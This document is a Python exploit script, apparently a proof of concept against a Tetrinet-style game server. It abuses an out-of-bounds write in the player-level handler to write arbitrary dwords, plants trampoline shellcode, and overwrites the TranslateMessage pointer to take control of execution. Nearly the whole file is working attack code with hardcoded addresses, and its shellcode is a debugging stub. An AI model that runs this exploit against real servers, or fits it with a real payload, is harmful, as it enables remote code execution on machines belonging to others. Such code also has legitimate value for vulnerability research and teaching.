# Summary:
# "player number" ends up in EAX, or "offset in player array"
# "player level" ends up in EBX
# pass WAY too big (or small) a value for player#, write an address into a function table
# overwrite the stub to another commonly called function
# octothorpe victory

import socket, sys, struct, binascii
import pytrinet._utils.utils as pyt

N    = 1024*4
s    = socket.socket()
port = 31457
ip   = sys.argv[1]

s.connect((ip, port))

# there may be a limit to how long this can be
shellcode = '\xcc' + "\x90"*100 + "\xeb\xfe"

nick    = shellcode
version = "1.13"

serverip = [ int(i) for i in sys.argv[1].split('.') ]

print(nick, version, serverip)
print("logging in...")
out = pyt.encode(nick, version, serverip)+"\xFF"
s.send(out)
_, _ = s.recv(N), s.recv(N)

# translate an RVA based on the vulnerable instruction
# CODE:0044B963 mov ds:dword_453F28[eax*4], ebx
def translate_rva(rva):
    base = 0x00453f28
    trans = (rva - base) / 4
    return trans

def write_dword_anywhere(data, addr):
    data_to_send = "lvl {} {}\xff".format(translate_rva(addr), data)
    s.send(data_to_send)

# write to this location to overwrite TranslateMessageA and gain EIP
translate_msg_addr = 0x00454358

# beginning of writable padding between sections - only 0x40 to play with
end_of_section = 0x00452DD4

# a couple of a useful debugging target addresses
ebfe_addr = 0x0044baff
cc_addr   = 0x004010A8

# address of pointer to shellcode - a static ptr to nicks in the image
#   while not referenced directly in this script,
#   it is assembled into the trampoline shellcode below
shellcode_ptr_addr = 0x004537bc

# high-bit sensitive trampoline shellcode
# 0:  a1 bc 37 45 00          mov    eax,ds:0x4537bc
# 5:  ff e0                   jmp    eax

# can only write signed positive dwords - these bytes must be less than 0x80
trampoline_shellcode = '\xa1\xbc\x37\x45\x00\xff\xe0\x00'
#                                     ^^              ^^

# first, write the trampoline to the end of a writable section:
# this will load the known pointer of the shellcode (the nickname)
# into eax and jump to it
for i in range(len(trampoline_shellcode) / 4):
    raw_data = trampoline_shellcode[i*4:(i+1)*4]
    dword_data = struct.unpack('<I', raw_data)[0]
    write_dword_anywhere(dword_data, end_of_section + i*4)

# write the trampoline to the translate_msg_a location
print("sending payload...")
write_dword_anywhere(end_of_section, translate_msg_addr)
